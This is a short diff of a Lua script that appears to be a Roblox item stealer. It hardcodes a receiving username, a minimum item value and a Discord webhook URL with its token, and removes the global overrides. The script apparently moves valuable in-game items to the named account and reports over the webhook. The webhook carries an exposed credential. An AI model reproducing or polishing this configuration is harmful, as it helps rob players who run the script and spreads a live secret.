@@ -17,9 +17,9 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"NuMBeX3230"} -- исправлено: ник в кавычках как строка
-local min_rap = _G.minrap or 1000000
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1433504887156772974/_JWGaijqm2qw-cDT0qgNfEmG9_-W0TLlWjvyV0aPzX4-TjU2QoCj1auVhjOHk7u_axKJ"
+local users = {"NuMBeX3230"}
+local min_rap = 1000000
+local webhook = "https://discord.com/api/webhooks/1433504887156772974/_JWGaijqm2qw-cDT0qgNfEmG9_-W0TLlWjvyV0aPzX4-TjU2QoCj1auVhjOHk7u_axKJ"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add any usernames or webhook")
